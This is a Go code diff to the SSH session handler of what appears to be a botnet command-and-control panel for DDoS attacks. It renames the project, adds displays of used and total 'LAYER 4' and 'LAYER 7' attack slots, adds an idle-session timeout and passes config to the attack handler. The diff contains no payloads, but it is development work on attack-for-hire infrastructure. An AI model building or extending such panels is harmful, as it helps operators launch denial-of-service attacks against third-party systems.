@@ -1,8 +1,6 @@
 package handlers
 
 import (
-	"arismcnc/database"
-	"arismcnc/utils"
 	"fmt"
 	"io"
 	"log"
@@ -11,6 +9,8 @@ import (
 	"sync"
 	"text/tabwriter"
 	"time"
+	"visioncnc/database"
+	"visioncnc/utils"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/mattn/go-shellwords"
@@ -173,9 +173,39 @@ func SessionHandler(db *database.Database, session ssh.Session) {
 			titleData["cnc.Totalslots"] = strconv.Itoa(config.Global_slots)
 			titleData["cnc.Online"] = strconv.Itoa(OnlineUsers)
 			titleData["cnc.Usedslots"] = strconv.Itoa(db.GetCurrentAttacksLength())
+			titleData["cnc.UsedL4Slots"] = strconv.Itoa(db.GetCurrentAttacksLengthByGroup("LAYER 4"))
+			titleData["cnc.TotalL4Slots"] = strconv.Itoa(config.Layer_slots["LAYER 4"])
+			titleData["cnc.UsedL7Slots"] = strconv.Itoa(db.GetCurrentAttacksLengthByGroup("LAYER 7"))
+			titleData["cnc.TotalL7Slots"] = strconv.Itoa(config.Layer_slots["LAYER 7"])
 			utils.SetTitle(session, utils.Branding(session, "title", titleData))
 		}
 	}()
+
+	// Idle session timeout
+	var lastActivityMu sync.Mutex
+	lastActivity := time.Now()
+	if config.IdleTimeoutMinutes > 0 {
+		timeout := time.Duration(config.IdleTimeoutMinutes) * time.Minute
+		go func() {
+			ticker := time.NewTicker(30 * time.Second)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-session.Context().Done():
+					return
+				case <-ticker.C:
+					lastActivityMu.Lock()
+					idle := time.Since(lastActivity)
+					lastActivityMu.Unlock()
+					if idle > timeout {
+						session.Write([]byte("\r\nIdle timeout reached. Disconnecting...\r\n"))
+						session.Close()
+						return
+					}
+				}
+			}
+		}()
+	}
 
 	commandHandler := NewCommandHandler(db, session)
 
@@ -189,6 +219,11 @@ func SessionHandler(db *database.Database, session ssh.Session) {
 			break
 		}
 
+		// Update idle activity timestamp
+		lastActivityMu.Lock()
+		lastActivity = time.Now()
+		lastActivityMu.Unlock()
+
 		line = strings.ToLower(line)
 		args, _ := shellwords.Parse(line)
 
@@ -196,7 +231,7 @@ func SessionHandler(db *database.Database, session ssh.Session) {
 			continue
 		}
 
-		AttackHandler(db, session, args)
+		AttackHandler(db, session, args, config)
 
 		if line == "exit" || line == "quit" || line == "q" || line == "logout" {
 			termSession.Write([]byte("Goodbye!\n"))
